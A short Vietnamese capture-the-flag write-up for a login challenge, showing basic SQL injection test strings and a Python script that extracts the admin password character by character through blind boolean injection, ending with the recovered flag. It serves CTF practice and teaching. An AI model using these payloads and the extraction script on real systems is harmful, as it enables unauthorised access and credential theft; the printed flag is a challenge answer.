# Bài 1:
- Ta thử test 1 số input sql injection cơ bản: 
	1' or '1' = '1
	password" OR "1"="1 ...
Sau đó ta phát hiện rằng website dính sql injection, và trả về cho ta hướng dẫn lấy flag là mk của user admin
Ta thấy mã nguồn php mà web trả về có vẻ không dính lỗi nào khác ngoài lỗi sql injection mà ta có thể khai thác được
nên ta sẽ dùng brute force để check mk của user thông qua lỗ hổng này
ta dùng đoạn code python sau
    ```python
    import requests

    for x in range(1, 30):
        url = 'http://ctfq.sweetduet.info:10080/~q6/'
        temp = '1\' or length(user.pass) = ' + str(x) + ' or \'1\' = \'12'
        data = {'id': 'admin', 'pass': temp}
        response = requests.post(url, data=data)
        print str(x) + str(response.content.splitlines()[8] == "      Congratulations!<br>")

    dataAl = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~'

    for x in range(1, 22):
        for letter in dataAl:
            url = 'http://ctfq.sweetduet.info:10080/~q6/'
            temp = '1\' or SUBSTR(user.pass, ' + str(x) + ', 1) = \'' + letter + '\' or \'1\' = \'12'
            # print temp
            data = {'id': 'admin', 'pass': temp}
            response = requests.post(url, data=data)
            if response.content.splitlines()[8] == "      Congratulations!<br>":
                print letter,
    ```
Đoạn code trên gồm 2 phần. phần đầu để check xem mk của user có bn kí tự và đoạn sau để cắt từng char của mk ra để check
ta được flag là FLAG_KpWa4ji3uZk6TrPK -> check lại tại trang login -> ok
